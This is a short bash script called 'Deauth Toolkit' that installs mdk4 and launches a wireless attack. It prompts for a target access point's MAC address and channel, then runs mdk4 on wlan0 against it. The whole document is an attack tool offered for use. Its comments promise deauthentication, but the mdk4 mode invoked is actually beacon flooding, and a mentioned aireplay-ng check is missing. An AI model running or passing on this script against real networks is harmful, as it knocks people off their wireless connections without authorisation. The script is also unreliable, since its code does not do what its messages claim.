#!/bin/bash
# Deauth Toolkit

echo "[*] Deploying Deauthentication attack..."

# Check for mdk4 or aireplay-ng
if ! command -v mdk4 &>/dev/null; then
    echo "[!] mdk4 not found. Installing..."
    pkg install -y mdk4
fi

# Start deauth attack on target AP
read -p "Enter target AP MAC: " target_mac
read -p "Enter target channel: " channel
echo "[*] Deauthing on channel $channel..."
mdk4 wlan0 b -c $channel -a $target_mac